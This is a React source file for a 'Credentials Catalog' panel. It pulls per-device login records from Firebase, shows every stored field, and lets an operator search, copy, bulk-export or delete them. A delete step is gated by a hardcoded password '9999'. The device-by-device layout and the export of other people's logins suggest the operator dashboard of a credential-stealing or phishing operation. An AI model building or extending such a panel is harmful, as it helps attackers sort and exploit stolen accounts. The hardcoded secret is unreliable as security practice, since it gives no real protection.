"use client";
import React, { useState } from "react";
import { ref, remove } from "firebase/database";
import { db } from "../lib/firebase";

export default function CredentialsPanel({ data, deviceSerialMap, showToast, deleteAllCredentials }) {
  const [search, setSearch] = useState("");
  const [filterMode, setFilterMode] = useState("all");
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [page, setPage] = useState(1);
  const perPage = 6;

  const loginData = data.login || {};
  const devices = data.user_data || {};

  let catalog = Object.keys(loginData).map(devId => {
    const list = Object.entries(loginData[devId] || {}).map(([key, val]) => ({
      key,
      ...val,
      _timestamp: val.timestamp || val.date || Date.now()
    })).sort((a, b) => b._timestamp - a._timestamp);

    return {
      deviceId: devId,
      serial: deviceSerialMap[devId] || 0,
      deviceInfo: devices[devId] || {},
      credentials: list,
      count: list.length,
      latestTimestamp: list[0]?._timestamp || 0
    };
  }).sort((a, b) => b.latestTimestamp - a.latestTimestamp);

  if (filterMode === "hasCreds") catalog = catalog.filter(c => c.count > 0);
  if (filterMode === "noCreds") catalog = catalog.filter(c => c.count === 0);
  if (selectedDevice) catalog = catalog.filter(c => c.deviceId === selectedDevice);

  if (search) {
    const q = search.toLowerCase();
    catalog = catalog.filter(c => 
      c.deviceId.toLowerCase().includes(q) || 
      c.credentials.some(cr => Object.values(cr).some(val => String(val).toLowerCase().includes(q)))
    );
  }

  const totalPages = Math.ceil(catalog.length / perPage) || 1;
  const paginated = catalog.slice((page - 1) * perPage, page * perPage);

  const deleteSingle = (devId, key) => {
    const pwd = prompt("Enter Password:");
    if (pwd !== "9999") return showToast("❌ Invalid Password", "error");
    remove(ref(db, `login/${devId}/${key}`)).then(() => showToast("Credential Deleted", "success"));
  };

  const copyCred = (fields) => {
    let str = "";
    for (let k in fields) {
      if (!k.startsWith("_") && k !== "key") str += `${k}: ${fields[k]}\n`;
    }
    navigator.clipboard.writeText(str);
    showToast("📋 All credentials copied!", "success");
  };

  const exportCreds = () => {
    let text = `=== CREDENTIALS EXPORT [${new Date().toLocaleString()}] ===\n\n`;
    catalog.forEach(item => {
      text += `📱 Device: ${item.deviceId} (S-${item.serial})\n`;
      item.credentials.forEach((c, idx) => {
        text += `   Record #${idx + 1}:\n`;
        Object.entries(c).forEach(([k, v]) => {
          if (!k.startsWith("_") && k !== "key") text += `     ${k}: ${v}\n`;
        });
      });
      text += "\n" + "-".repeat(40) + "\n";
    });

    const blob = new Blob([text], { type: "text/plain" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = `credentials_export_${Date.now()}.txt`;
    a.click();
  };

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2><i className="fas fa-key" style={{ color: "var(--gold)" }}></i> Credentials Catalog</h2>
          <p className="panel-sub">View and manage all saved credentials across devices</p>
        </div>
        <div className="panel-stats">
          <button className="btn-delete-all credential" onClick={deleteAllCredentials}>
            <i className="fas fa-trash-alt"></i> Delete All
          </button>
        </div>
      </div>

      <div className="credentials-catalog active">
        <div className="catalog-toolbar">
          <div className="toolbar-search">
            <i className="fas fa-search"></i>
            <input 
              type="text" 
              placeholder="Search by device, field, or value..." 
              value={search}
              onChange={(e) => { setSearch(e.target.value); setPage(1); }}
            />
          </div>
          <button className={`toolbar-btn ${filterMode === "all" ? "active" : ""}`} onClick={() => setFilterMode("all")}>All</button>
          <button className={`toolbar-btn ${filterMode === "hasCreds" ? "active" : ""}`} onClick={() => setFilterMode("hasCreds")}>With Creds</button>
          <button className={`toolbar-btn ${filterMode === "noCreds" ? "active" : ""}`} onClick={() => setFilterMode("noCreds")}>No Creds</button>
          <button className="toolbar-btn" onClick={exportCreds}><i className="fas fa-download"></i> Export</button>
        </div>

        <div className="device-filter-tabs">
          <button className={`filter-tab ${!selectedDevice ? "active" : ""}`} onClick={() => setSelectedDevice(null)}>All Devices</button>
          {catalog.filter(c => c.count > 0).slice(0, 5).map(c => (
            <button 
              key={c.deviceId} 
              className={`filter-tab ${selectedDevice === c.deviceId ? "active" : ""}`}
              onClick={() => setSelectedDevice(c.deviceId)}
            >
              📱 {c.deviceId.slice(0, 10)} <span className="tab-count">{c.count}</span>
            </button>
          ))}
        </div>

        <div className="creds-grid">
          {paginated.map(item => (
            <div key={item.deviceId} className="cred-card">
              <div className="cred-card-header">
                <div className="device-name-tag">
                  <span className="dev-name">{item.deviceId}</span>
                  {item.serial > 0 && <span className="dev-serial">S-{item.serial}</span>}
                </div>
                <span className="cred-count-badge"><i className="fas fa-key"></i> {item.count}</span>
              </div>
              <div className="cred-card-body">
                {item.credentials.map((cred, idx) => (
                  <div key={cred.key || idx} className="cred-item">
                    <div className="cred-item-header">
                      <span className="record-num">#{idx + 1}</span>
                      <div className="cred-actions">
                        <button onClick={() => copyCred(cred)}><i className="fas fa-copy"></i></button>
                        <button className="danger" onClick={() => deleteSingle(item.deviceId, cred.key)}><i className="fas fa-trash"></i></button>
                      </div>
                    </div>
                    <div className="cred-fields">
                      {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "key").map(([k, v]) => (
                        <div key={k} className="cred-field">
                          <span className="field-label">{k}</span>
                          <span className="field-value">{String(v)}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>

        <div className="catalog-pagination">
          <button onClick={() => setPage(p => Math.max(1, p - 1))} disabled={page <= 1}><i className="fas fa-chevron-left"></i></button>
          <span>Page {page} of {totalPages}</span>
          <button onClick={() => setPage(p => Math.min(totalPages, p + 1))} disabled={page >= totalPages}><i className="fas fa-chevron-right"></i></button>
        </div>
      </div>
    </div>
  );
}
